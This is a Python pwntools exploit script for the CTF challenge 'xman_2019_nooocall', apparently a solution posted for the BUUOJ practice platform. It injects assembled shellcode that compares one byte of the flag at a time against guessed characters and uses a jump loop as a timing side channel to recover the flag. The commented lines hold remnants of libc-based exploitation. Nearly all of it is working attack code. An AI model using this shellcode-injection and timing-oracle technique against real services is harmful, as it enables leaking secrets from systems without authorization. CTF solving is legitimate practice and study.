#coding:utf-8
import sys
from pwn import *
# context.log_level='debug'
elfelf='./xman_2019_nooocall'
context.arch='amd64'
from time import time
i=0
o=0
asd=['f','l','a','g','-','{','}','0','1','2','3','4','5','6','7','8','9','b','c','d','e']
flag=''
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			# elf=ELF(elfelf)
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			# one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',27709)
			# elf=ELF(elfelf)
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			# one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		j=ord(asd[o])
		shellcode='''
		mov    rdx, qword ptr [rbp - 0x20]
		add    rdx,%d
		mov    al, byte ptr [rdx]
		cmp    al,%d
		'''%(i,j)
		

		# gdb.attach(io)
		io.recv()
		if i == 0 :
			io.send(asm(shellcode)+'\x74\xf6')
		else :
			io.send(asm(shellcode)+'\x74\xf2')
		start = time()
		io.can_recv_raw(timeout = 0.7)
		end = time()
		io.close()
		if end - start > 0.7:
			flag+=asd[o]
			print flag
			if asd[o]=='}':
				exit()
			i+=1
			o=0
		else:
			o+=1

		# print i
		# io.interactive()

		
		
		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		# success('heap_base:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		
		# io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue